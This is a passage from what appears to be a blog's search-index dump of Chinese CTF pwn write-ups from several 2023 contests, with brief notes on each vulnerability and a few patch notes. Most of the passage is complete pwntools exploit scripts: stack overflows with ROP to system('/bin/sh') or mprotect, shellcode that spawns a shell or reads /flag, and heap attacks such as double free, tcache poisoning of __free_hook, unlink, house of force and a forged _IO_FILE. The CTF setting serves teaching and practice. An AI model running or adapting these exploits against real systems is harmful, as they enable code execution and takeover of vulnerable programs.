exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''continue'''.format(**locals())binary = './fakeSSDP'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)io = remote('node4.buuoj.cn',27898)ru('name')sl('text')#gdb.attach(io,'b *0x0403591')ru('Waiting for SSDP request')from base64 import b64encodersi = 0x000000000045fe1e # call rsip  = asm(shellcraft.sh())p += b'ssdp:all'p  = p.ljust(0xe8,b'A')p += p64(rsi)pay  = b'M-SEARCH * HTTP/1.1\\r\\n'pay += b'HOST: 239.255.255.250:1900\\r\\n'pay += b'MAN: \"ssdp:discover\"\\r\\n'pay += b'MX: 3\\r\\n'pay += b'ST: '+p+b'\\r\\n'pay += b'USER-AGENT: Microsoft Edge/119.0.2151.93 Windows\\r\\n'sl(b64encode(pay))io.interactive()‍‍‍‍找到漏洞点后就非常好搞了，静态分析起来确实有点困难‍​​‍  存一下‍ssdp_all = b'M-SEARCH * HTTP/1.1\\r\\n' \\    + b'HOST: 239.255.255.250:1900\\r\\n' \\    + b'MAN: \"ssdp:discover\"\\r\\n' \\    + b'MX: 3\\r\\n' \\    + b'ST: ssdp:all\\r\\n' \\    + b'USER-AGENT: Google Chrome/87.0.4280.88 Windows\\r\\n\\r\\n'ssdp_uuid = b'M-SEARCH * HTTP/1.1\\r\\n' \\    + b'HOST: 239.255.255.250:1900\\r\\n' \\    + b'MAN: \"ssdp:discover\"\\r\\n' \\    + b'MX: 3\\r\\n' \\    + b'ST: uuid:1\\r\\n' \\    + b'USER-AGENT: Google Chrome/87.0.4280.88 Windows\\r\\n\\r\\n'ssdp_root = b'M-SEARCH * HTTP/1.1\\r\\n' \\    + b'HOST: 239.255.255.250:1900\\r\\n' \\    + b'MAN: \"ssdp:discover\"\\r\\n' \\    + b'MX: 3\\r\\n' \\    + b'ST: upnp:rootdevice\\r\\n' \\    + b'USER-AGENT: Google Chrome/87.0.4280.88 Windows\\r\\n\\r\\n'notify_alive = b'NOTIFY * HTTP/1.1\\r\\n' \\    + b'HOST: 239.255.255.250:1900\\r\\n' \\    + b'CACHE-CONTROL: max-age = seconds until advertisement expires\\r\\n' \\    + b'LOCATION: 3\\r\\n' \\    + b'USN: 1\\r\\n' \\    + b'NTS: ssdp:alive\\r\\n' \\    + b'NT: upnp:rootdevice\\r\\n\\r\\n'notify_bye = b'NOTIFY * HTTP/1.1\\r\\n' \\    + b'HOST: 239.255.255.250:1900\\r\\n' \\    + b'CACHE-CONTROL: max-age = seconds until advertisement expires\\r\\n' \\    + b'LOCATION: 3\\r\\n' \\    + b'USN: 1\\r\\n' \\    + b'NTS: ssdp:byebye\\r\\n' \\    + b'NT: upnp:rootdevice\\r\\n\\r\\n'notify_bye_inject = b'NOTIFY * HTTP/1.1\\r\\n' \\    + b'HOST: 239.255.255.250:1900\\r\\n' \\    + b'CACHE-CONTROL: max-age = seconds until advertisement expires\\r\\n' \\    + b'LOCATION: 3\\r\\n' \\    + b'USN: \\'/bin/sh\\'\\r\\n' \\    + b'NTS: ssdp:byebye\\r\\n' \\    + b'NT: upnp:rootdevice\\r\\n\\r\\n'"
  },
  
  {
    "title": "2023香山杯决赛Pwn-分析",
    "url": "/posts/2023%E9%A6%99%E5%B1%B1%E6%9D%AF%E5%86%B3%E8%B5%9BPwn-%E5%88%86%E6%9E%90/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2023-11-20 20:00:00 +0800",
    





    
    "snippet": "  进决赛了，但是和金砖的比赛冲突了决赛没时间去了呜呜呜😭😭😭，选择去打金砖了，好打一点。camera‍程序分析‍​​‍根据程序的功能然后加上一些手法，可以double free后面就是填满 tcachebins 然后 fastbin double free 就好了‍​​‍‍cat 用的顺手了，我就直接用 cat  ORW 就好了​​‍Break‍from pwn import *s    ...",
    "content": "  进决赛了，但是和金砖的比赛冲突了决赛没时间去了呜呜呜😭😭😭，选择去打金砖了，好打一点。camera‍程序分析‍​​‍根据程序的功能然后加上一些手法，可以double free后面就是填满 tcachebins 然后 fastbin double free 就好了‍​​‍‍cat 用的顺手了，我就直接用 cat  ORW 就好了​​‍Break‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''continue'''.format(**locals())binary = './dalao_slo/pwn'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)libc = elf.libcio = start(binary)#io = remote()def rm(size):    ru('&gt;&gt; \\n')    sl('1')    sl(str(size))def add(size,text):    ru('&gt;&gt; \\n')    sl('2')    ru('Please select a film of your preference within your budget.\\n')    sl(str(size))    ru('Content: \\n')    sl(text)def load(idx):    ru('&gt;&gt; \\n')    sl('3')    ru('whitch one do you want to load\\n')    sl(str(idx))add(0x488,'text0')add(0x60,'text1')load(0)rm(1)add(0x488,'')load(0)rm(1)ru('content: ')main_arena = uu64(r(6))libc_base = main_arena - 2018272add(0x488,'pad')for i in range(8):    add(0x60,f'text{i}')for i in range(8+1,1,-1):    load(i)rm(8)for i in range(7):    add(0x60,f'')#load(8)load(7)rm(3)ru('content: ')xx = uu64(r(6))heap_base = xx - 1952libc.address = libc_base_IO_list_all    = libc.sym['_IO_list_all']add(0x60,p64(_IO_list_all-0x20))add(0x60,'/bin/sh\\x00')add(0x60,'/bin/sh\\x00')add(0x60,'/bin/sh\\x00')pay = p64(0)*2 + p64(heap_base + 2832)add(0x60,pay)libc.address = libc_baselibc_rop = ROP(libc)system          = libc.sym['system']mprotect        = libc.sym['mprotect']setcontext      = libc.sym['setcontext']__free_hook     = libc.sym['__free_hook']_IO_list_all    = libc.sym['_IO_list_all']_IO_wfile_jumps = libc.sym['_IO_wfile_jumps']rax = libc_rop.find_gadget(['pop rax','ret'])[0]rdi = libc_rop.find_gadget(['pop rdi','ret'])[0]rsi = libc_rop.find_gadget(['pop rsi','ret'])[0]rdx = libc_rop.find_gadget(['pop rdx','pop rbx','ret'])[0]RCE = setcontext + 61fake_IO_addr = heap_base + 2832shellcode_addr = fake_IO_addr + 248pop_5_ret = libc_rop.find_gadget(['pop rbx','pop rbp','pop r13','pop r14','pop r15','ret'])[0] # pop 5*;ret  # libc.2.31 9.12#lss('pop_5_ret')#gdb.attach(io)fake_IO_FILE  = p64(8)fake_IO_FILE += p64(RCE) # callfake_IO_FILE += p64(0) +p64(1) # _IO_write_base # _IO_write_ptrfake_IO_FILE += p64(fake_IO_addr) # fp-&gt;_IO_write_ptrfake_IO_FILE += p64(rdi) + p64(heap_base) + p64(rsi) + p64(0x1000) + p64(rdx) + p64(7) # pop*5 to mefake_IO_FILE += p64(fake_IO_addr+0xc0)fake_IO_FILE += p64(mprotect)fake_IO_FILE += p64(shellcode_addr)fake_IO_FILE  = fake_IO_FILE.ljust(0x90,b'\\x00')fake_IO_FILE += p64(fake_IO_addr+0x10)fake_IO_FILE += p64(pop_5_ret) # setcontext Tow CALL #need pop * 5 ;retfake_IO_FILE  = fake_IO_FILE.ljust(0xb0,b'\\x00')fake_IO_FILE += p64(1) # modefake_IO_FILE  = fake_IO_FILE.ljust(0xc8,b'\\x00')fake_IO_FILE += p64(_IO_wfile_jumps + 0x30)fake_IO_FILE  = fake_IO_FILE.ljust(0xe0,b'\\x00')fake_IO_FILE += p64(fake_IO_addr)fake_IO_FILE += asm(shellcraft.cat('/flag'))add(0x400,fake_IO_FILE)lss('libc_base')lss('heap_base')lss('_IO_list_all')#gdb.attach(io,'brva 0x001354')#gdb.attach(io,'b *_IO_switch_to_wget_mode')#rm(1)ru('&gt;&gt; \\n')sl('4')io.interactive()‍fix‍  方法1直接减少最大堆块数量‍​​fix 后​​‍  方法2‍正常情况下 加10个 删 10个​​​​但是呢，主要还是free 后的结构体 +0x8 这个残留，导致漏洞百出​​​​‍fix前​​​​fix 后​​mov rdi,[rax+8]mov qword ptr [qword_4060],rdimov qword ptr [rax+0x10],0mov qword ptr [rax+8],0​​‍没有残留了‍​​​​‍‍how2stack‍‍程序分析‍nbytes 可控，栈溢出是必然存在的‍​​‍Break‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''brva 0x00018A0continue#stack 40'''.format(**locals())binary = './pwn'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)#io = remote()def add(size,text):    ru('Your choice: ')    sl('1')    ru('Length: ')    sl(str(size))    ru('Data: ')    s(text)#gdb.attach(io,'brva 0x00018A0')pay = b'A' * 0x64pay += b'\\xff' * 4add(0x68,pay)ru('ff '*4)stack =  uu64(bytes.fromhex(io.recvline()[:-1].replace(b' ',b'').decode()))pay = b'A' * 0x64pay += b'\\xff' * 4pay += p64(stack+48)add(len(pay),pay)ru('Result in hex: ')libc_addr =  uu64(bytes.fromhex(io.recvline()[:-1].replace(b' ',b'').decode()))libc_base = libc_addr - 147587libc = elf.libclibc.address = libc_baselibc_rop = ROP(libc)mprotect        = libc.sym['mprotect']rax = libc_rop.find_gadget(['pop rax','ret'])[0]rdi = libc_rop.find_gadget(['pop rdi','ret'])[0]rsi = libc_rop.find_gadget(['pop rsi','ret'])[0]rdx = libc_rop.find_gadget(['pop rdx','pop rbx','ret'])[0]pay = b'A' * 0x64pay += b'\\xff' * 4pay += p64(stack+48)pay  = pay.ljust(0x78,b'\\x00')pay += p64(rdi) + p64(stack &amp; 0xFFFFFFFFFFFFF000)pay += p64(rsi) + p64(0x3000)pay += p64(rdx) + p64(7) * 2pay += p64(mprotect)pay += p64(stack+88)pay += asm(shellcraft.cat('/flag'))#db.attach(io,'brva 0x0000177E')lss('stack')lss('libc_base')gdb.attach(io,'brva 0x018E4')add(len(pay),pay)io.interactive()‍fix‍直接写死 0x60‍​​‍‍ezgame‍程序分析‍‍漏洞 gets() 溢出,‍​​看看上面那个函数 sub_4015F7(100LL, 1100LL, 10LL, 30LL, 15LL);​‍​​‍Break‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''continue'''.format(**locals())binary = './pwn'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)#io = remote()# 增加攻击值for i in range(200):    ru('&gt; ')    sl('2')    ru('What kind of monster do you want to fight?\\n')    sl('0')    ru('&gt; ')    sl('2')    ru('What kind of monster do you want to fight?\\n')    sl('1')##ru('&gt; ')#sl('1')# 后面直接 溢出 然后正常 ROP ret2libc 就行了rop = ROP(binary)libc = elf.libc#gdb.attach(io,'b *0x04017FC')ru('&gt; ')sl('2')ru('What kind of monster do you want to fight?\\n')sl('2')pay = b'A' * 0x658pay += p64(rop.find_gadget(['pop rdi','ret'])[0]) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(0x401749)sl(pay)ru('are increased.\\n')x = uu64(r(6))libc_base = x - libc.sym['puts']system = libc_base + libc.sym['system']bin_sh = libc_base + next(libc.search(b'/bin/sh\\x00'))lss('x')ru('What kind of monster do you want to fight?\\n')sl('2')pay = b'A' * 0x658pay += p64(rop.find_gadget(['pop rdi','ret'])[0]+1) +p64(rop.find_gadget(['pop rdi','ret'])[0]) + p64(bin_sh) + p64(system) + p64(0x401749)sl(pay)io.interactive()‍‍fix‍  fix 前 gets(v1)溢出​​​​‍直接patch 成一个 sys_call read , 正常读取内容 但是限制输入长度‍‍​​‍这样应该是没问题的‍"
  },
  
  {
    "title": "2023一带一路暨金砖国家技能发展与技术创新大赛之网络安全在企业信息管理中的应用-Pwn-WriteUps",
    "url": "/posts/2023%E4%B8%80%E5%B8%A6%E4%B8%80%E8%B7%AF%E6%9A%A8%E9%87%91%E7%A0%96%E5%9B%BD%E5%AE%B6%E6%8A%80%E8%83%BD%E5%8F%91%E5%B1%95%E4%B8%8E%E6%8A%80%E6%9C%AF%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E4%B9%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9C%A8%E4%BC%81%E4%B8%9A%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8-Pwn-WriteUps/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2023-11-19 20:00:00 +0800",
    





    
    "snippet": "‍‍‍pwn-pwn0402‍​​​​‍  我们采用溢出后再次read  然后写shellcode 在栈上ret‍​​‍​​from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)s...",
    "content": "‍‍‍pwn-pwn0402‍​​​​‍  我们采用溢出后再次read  然后写shellcode 在栈上ret‍​​‍​​from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''continue'''.format(**locals())binary = './pwn0402'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)#io = remote()main = 0x400A05d1 = bytes.fromhex('90f8e3bffef9f2bf')[::-1]ru('secret: ')x = int(io.recvline(),16)rdx_rsi = 0x0000000000442b89 # pop rdx ; pop rsi ; retrax     = 0x000000000041f6b4 # pop rax ; retxsh = 0x00000000004c1aa7 # xor byte ptr [rdx], al ; retgdb.attach(io,'b *0x0400ABF')print(hex(x))binsh = x + 3498p = b''.ljust(0x98,b'\\x90')p += p64(rdx_rsi)p += p64(0x100) + p64(x + 200)p += p64(0x4016e6) #rdip += p64(0)p += p64(0x0412ECB) # read sl(p)pause()sl(p64(x+210)+b'\\x90'*20+asm(shellcraft.sh()))‍call read 的地址也可以调整下‍​​‍‍pwn-orw_h1‍libc 2.27 __free_hook 打 setcontext‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''continue'''.format(**locals())binary = './orw_h1'libelf = './libc-2.27.so'if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)#io = remote()def add(size,text='A'):    sla('&gt;&gt; ','1')    sla('tion:\\n',str(size))    sla('tion:\\n',text)def rm(idx):    sla('&gt;&gt; ','2')    sla('index: ',str(idx))def edit(idx,text):    sla('&gt;&gt; ','3')    sla('index: ',str(idx))    sla('tion:\\n',text)def show(idx):    sla('&gt;&gt; ','4')    sla('index: ',str(idx))add(0x500) # idx0add(0x100) # idx1rm(0)show(0)main_arena= uu64(r(6))libc_base = main_arena - 4111520__free_hook = libc_base + libc.sym['__free_hook']setcontext = libc_base + libc.sym['setcontext']mprotect = libc_base + libc.sym['mprotect']add(0x500) # idx2rdi = libc_base + 0x2164frsi = libc_base + 0x23a6ardx = libc_base + 0x1b96ret = libc_base + 0x8aaadd(0x100) # idx3add(0x100) # idx4rm(1)rm(3)edit(3,p64(__free_hook)*2)pay = b'\\x41' *0xa0+ p64(__free_hook+0x10) + p64(ret)edit(2,pay)add(0x100) #idx5add(0x100) #idx6 free_hook_addrpay = p64(setcontext + 53) + p64(0x0) + p64(rdi) + p64(__free_hook &amp;0xfffffffffffff000) + p64(rsi) + p64(0x1000) + p64(rdx) + p64(7) + p64(mprotect)pay += p64(__free_hook + len(pay)+8)pay += asm(shellcraft.cat('/flag'))edit(6,pay)ls(hex(libc_base))ls(hex(__free_hook))gdb.attach(io,'b *$rebase(0x00E60)')rm(2)io.interactive()‍‍‍pwn1-ez_pwn2‍存在 RWX段  stack不能获取shell,但是可以 ORW​​‍stack RWX, 程序会输出一个stack地址, 存在栈溢出输入的buf 不够 ORW shellcode,所以我们先一个构造一个read 二次写ORW shellcode 到栈上去执行‍  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''continue'''.format(**locals())binary = './ez_pwn2'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)#io = remote('110.110.110.111',49165)ru('shh: ')x=  int(r(len('0x7ffce2bcc3c0')),16)lss('x')#gdb.attach(io)# 构造一个readsc = f'''mov rsi,{x}mov rdx,0x200syscall'''pay = asm(sc)pay = pay.ljust(0x28,b'A')pay +=  p64(x)sl(pay)pause()# ORWsc = shellcraft.open('/flag')sc += shellcraft.read('rax','rsp',0x40)sc += shellcraft.write(1,'rsp',0x40)pay = len(pay) * b'\\x90' + asm(sc)sl(pay)io.interactive()‍​​‍‍pwn2-drunk2‍一道  libc 2.31 的堆体存在 UAF 漏洞‍正常只可以 malloc 0x40 但是 tcache 填满后 进入的 fastbin ,并不能进入unsortedbin泄露libc存在一个 gift 可以 malloc 一个 0x90 的heap chunk‍修改正常 的 tcachebins  链表，然后控制 tcachebin struct, 将 0x90 的堆块链表数量改成7​​然后再利用上面的漏洞 打堆块重叠 去free 0x90 进入 unsortedbin 泄露libc​​后面直接打 __free_hook​​‍‍  exploit‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''continue'''.format(**locals())binary = './drunk2'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)#io = remote('110.110.110.111',49178)def add(size,text):    ru('--&gt;&gt;&gt;&gt; \\n')    sl('1')    ru('What size cup:\\n')    sl(str(size))    ru('something to add?\\n')    sl(text)def rm(idx):    ru('--&gt;&gt;&gt;&gt; \\n')    sl('2')    ru('cup number: \\n')    sl(str(idx))def show(idx):    ru('--&gt;&gt;&gt;&gt; \\n')    sl('3')    ru('you have left: \\n')    sl(str(idx))def edit(idx,text):    ru('--&gt;&gt;&gt;&gt; \\n')    sl('4')    ru('which cup:\\n')    sl(str(idx))    ru('refill')    sl(text)def bd():    ru('--&gt;&gt;&gt;&gt; \\n')    sl('888')libc = elf.libcbd()add(0x38,'A') # 0add(0x38,'B') # 1rm(1)rm(0)show(0)heap_base = uu64(r(6)) - 0x370edit(0,p64(heap_base + 0x10))pay = b'\\x00' * 0x0e + b'\\x07'add(0x38,'exp1') # 2add(0x38,pay) # 3# exp 2add(0x38,'A') # 4add(0x38,'B') # 5rm(4)rm(5)edit(5,p64(heap_base + 0x2a0))add(0x38,'6') # 6add(0x38,'7') # 7rm(7)show(7)libc_base = uu64(r(6)) - 2018272__free_hook = libc_base + libc.sym['__free_hook']system = libc_base + libc.sym['system']add(0x38,'/bin/sh\\x00') # 8add(0x38,'B') # 9add(0x38,'/bin/sh\\x00') # 8add(0x38,'B') # 9rm(10)rm(11)edit(11,p64(__free_hook))add(0x38,'/bin/sh\\x00') # 8add(0x38,p64(system)) # 9lss('heap_base')lss('libc_base')#gdb.attach(io)rm(7)io.interactive()​​‍"
  },
  
  {
    "title": "2023羊城杯-决赛Pwn-Writeups",
    "url": "/posts/2023%E7%BE%8A%E5%9F%8E%E6%9D%AF-%E5%86%B3%E8%B5%9BPwn-Writeups/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2023-09-09 20:00:00 +0800",
    





    
    "snippet": "‍‍‍​​‍‍PWN-arrary_index_bank‍‍程序功能1 可以泄露stack 上的数据 如 stack_addr 和 elf_addr 等2 修改一个stack[idx] ;idx !&gt; you ;you = 1  修改 stack[idx] 处的数据3 存在后 system(“\\/bin/sh”)4 漏洞点 可以修改 -idx 处 ,只要计算好 idx 就可以 从 st...",
    "content": "‍‍‍​​‍‍PWN-arrary_index_bank‍‍程序功能1 可以泄露stack 上的数据 如 stack_addr 和 elf_addr 等2 修改一个stack[idx] ;idx !&gt; you ;you = 1  修改 stack[idx] 处的数据3 存在后 system(“\\/bin/sh”)4 漏洞点 可以修改 -idx 处 ,只要计算好 idx 就可以 从 stack 0x7f 处 到 elf 0x55 处，从而修改 elf 上的you 值‍‍​jle 跳转 也就是可以输入 负数‍‍​​‍‍​​‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote('')    else:        return process([binary] + argv, *a, **kw)gdbscript = '''#b *$rebase(0x0144D)b *$rebase(0x00014C6)continue'''.format(**locals())binary = './pwn'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)def show(idx):    ru('&gt; ')    sl('1')    ru('Whose account?\\n')    sl(str(idx))    ru('] =')    return int(io.recvline())def edit(idx,num):    ru('&gt; ')    sl('2')    ru('Whose account?\\n')    sl(str(idx))    ru('How much?\\n')    sl(str(num))elf_addr    = show(-1) - 5158stack_addr  = show(-2) - 0x30you         = elf_addr + 0x04010win         = elf_addr + 0x01318pad =  you - stack_addrpad = pad // 8edit(pad,0x10)  #  关键点  修改you 为 0x10edit(9,win) # 修改函数返回地址sl('') # retrun ls(hex(elf_addr))ls(hex(stack_addr))#ls(hex(ret_addr))io.interactive()‍PWN-Printf_but_not_fmtstr‍  直接unlink做forge_chunk-&gt;fd # 这个fd 指向的chunk-&gt;bk 位置的值必须是 forge_chunk 的地址from pwn import *binary  = './pwn'libc    = './libc.so.6'ld      = './ld-linux-x86-64.so.2'#io = process([ld,binary,])context.terminal = ['tmux','splitw','-h']io = process([ld,binary],env={'LD_PRELOAD':'./libc.so.6'})io = remote('192.168.31.155',50038)#context.terminal  = ['tmux','splitw','-h','-l','130']context.log_level = 'debug'def ru(x): return io.recvuntil(x)def sl(x): io.sendline(x)def s(x): io.send(x)def add(idx,size):    ru('&gt;')    sl('1')    ru('Index: ')    sl(str(idx))    ru('Size: ')    sl(str(size))def rm(idx):    ru('&gt;')    sl('2')    ru('Index: ')    sl(str(idx))def edit(idx,text):    ru('&gt;')    sl('3')    ru('Index: ')    sl(str(idx))    ru(': ')    s(text)def show(idx):    ru('&gt;')    sl('4')    ru('Index: ')    sl(str(idx))add(0,0x508)add(1,0x508)#add(2,0x508)rm(0)show(0)ru(b'Content: ')min_arena = u64(ru('\\n')[:-1].ljust(8,b'\\x00'))libc_base = min_arena -  2059456log.success(hex(libc_base))ta = 0x4040E0fd = ta - 0x18bk = ta - 0x10pay = p64(0) + p64(0x501)pay += p64(fd) + p64(bk)pay = pay.ljust(0x500,b'\\x00')pay += p64(0x500)edit(0,pay)rm(1) # idx0 idx1 都进入topchunk # 合并后topchunk 的size 位置在我们伪造的size 看图win  = 0x4011D6puts = 0x404018 # gotpay  = p64(0) * 3pay += p64(fd)pay += p64(puts)edit(0,pay)#gdb.attach(io)edit(1,p64(win))io.interactive()​​‍forge_chunk-&gt;fd # 这个fd 指向的chunk-&gt;bk 位置的值必须是 forge_chunk 的地址​‍‍‍‍‍‍‍​idx0也加入 topchunk‍​​‍‍‍‍‍PWN-easy_force‍      house of force    libc2.23 可以用  申请大小没有限制​​‍‍利用堆溢出，覆盖top_chunk 的size 为 0xFFFFFFFFFFFFFFFF​‍‍​​‍‍然后 就可以任意地址申请了‍target_addr = 0x602040# 想申请到这个地址topchunk_addr = 0x602040 # touchunk 在堆上的地址size = target - topchunk_addr - 0x20 # payadd(idx,size,'xx')add size 后 heap 块就来到了这里，都会再申请 就在这里了​​‍再次add 一个‍add(3,0x20,'AAAAAAA')‍此时我们再看一下target_addr里的内容 malloc 已经被修改，达到目的‍​​‍exploit‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))#ls      = lambda data               :log.success(data)ls = lambda s            : 